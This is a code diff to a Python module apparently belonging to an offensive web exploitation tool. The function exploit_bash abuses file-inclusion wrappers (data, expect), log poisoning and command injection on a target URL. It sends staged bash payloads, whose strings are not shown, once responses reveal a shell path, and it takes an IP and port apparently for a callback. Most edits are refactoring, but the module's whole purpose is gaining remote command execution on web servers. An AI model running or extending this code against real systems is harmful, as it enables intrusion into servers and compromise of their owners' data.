@@ -1,13 +1,14 @@
+"""Bash injection"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.args_check import headers
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
 
 
 def exploit_bash(exploit, method, ip, port):
+    """bash exploit"""
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
@@ -26,22 +27,22 @@ def exploit_bash(exploit, method, ip, port):
 
         if args.postreq:
             res, _ = request.REQUEST(
-                url,
-                args.httpheaders,
-                post.replace(config.tempArg, encode(bashTmpTest)),
-                config.proxies,
-                "",
-                "",
+                url=url,
+                headersData=args.httpheaders,
+                postData=post.replace(config.tempArg, encode(bashTmpTest)),
+                proxy=config.proxies,
+                exploitType="",
+                exploitMethod="",
                 exploit=True,
             )
         else:
             res, _ = request.REQUEST(
-                url.replace(config.tempArg, encode(bashTmpTest)),
-                args.httpheaders,
-                post,
-                config.proxies,
-                "",
-                "",
+                url=url.replace(config.tempArg, encode(bashTmpTest)),
+                headersData=args.httpheaders,
+                postData=post,
+                proxy=config.proxies,
+                exploitType="",
+                exploitMethod="",
                 exploit=True,
             )
 
@@ -85,6 +86,7 @@ def exploit_bash(exploit, method, ip, port):
                     exploit=True,
                 )
             return True
+
     if method == "DATA":
         if args.postreq:
             res, _ = request.REQUEST(
@@ -106,6 +108,7 @@ def exploit_bash(exploit, method, ip, port):
                 "",
                 exploit=True,
             )
+
         if "/bash" in res.text:
             printInfo(ip, port, "bash", "data wrapper")
             if args.postreq:
@@ -118,6 +121,7 @@ def exploit_bash(exploit, method, ip, port):
                     "",
                     exploit=True,
                 )
+
                 request.REQUEST(
                     url.replace(config.tempArg, encode(bashPayloadStageTwo)),
                     args.httpheaders,
@@ -147,6 +151,7 @@ def exploit_bash(exploit, method, ip, port):
                     exploit=True,
                 )
             return True
+
     if method == "EXPECT":
         if args.postreq:
             res, _ = request.REQUEST(
@@ -168,27 +173,26 @@ def exploit_bash(exploit, method, ip, port):
                 "",
                 exploit=True,
             )
+
         if "/bash" in res.text:
             printInfo(ip, port, "bash", "expect wrapper")
             if args.postreq:
                 request.REQUEST(
-                    url,
-                    args.httpheaders,
-                    post.replace(config.tempArg, encode(bashPayloadStageOne)),
-                    post,
-                    config.proxies,
-                    "",
-                    "",
+                    url=url,
+                    headersData=args.httpheaders,
+                    postData=post.replace(config.tempArg, encode(bashPayloadStageOne)),
+                    proxy=config.proxies,
+                    exploitType="",
+                    exploitMethod="",
                     exploit=True,
                 )
                 request.REQUEST(
-                    url,
-                    args.httpheaders,
-                    post.replace(config.tempArg, encode(bashPayloadStageTwo)),
-                    post,
-                    config.proxies,
-                    "",
-                    "",
+                    url=url,
+                    headersData=args.httpheaders,
+                    postData=post.replace(config.tempArg, encode(bashPayloadStageTwo)),
+                    proxy=config.proxies,
+                    exploitType="",
+                    exploitMethod="",
                     exploit=True,
                 )
             else:
@@ -211,6 +215,7 @@ def exploit_bash(exploit, method, ip, port):
                     exploit=True,
                 )
             return True
+
     if method == "TRUNC":
         exploit_log_poison(
             ip,
@@ -245,6 +250,7 @@ def exploit_bash(exploit, method, ip, port):
                 "",
                 exploit=True,
             )
+
         if "/bin" in res.text and "/bash" in res.text:
             printInfo(ip, port, "bash", "command injection")
             if args.postreq:
@@ -252,7 +258,6 @@ def exploit_bash(exploit, method, ip, port):
                     url,
                     args.httpheaders,
                     post.replace(config.tempArg, encode(bashPayloadStageOne)),
-                    post,
                     config.proxies,
                     "",
                     "",
@@ -262,7 +267,6 @@ def exploit_bash(exploit, method, ip, port):
                     url,
                     args.httpheaders,
                     post.replace(config.tempArg, encode(bashPayloadStageTwo)),
-                    post,
                     config.proxies,
                     "",
                     "",
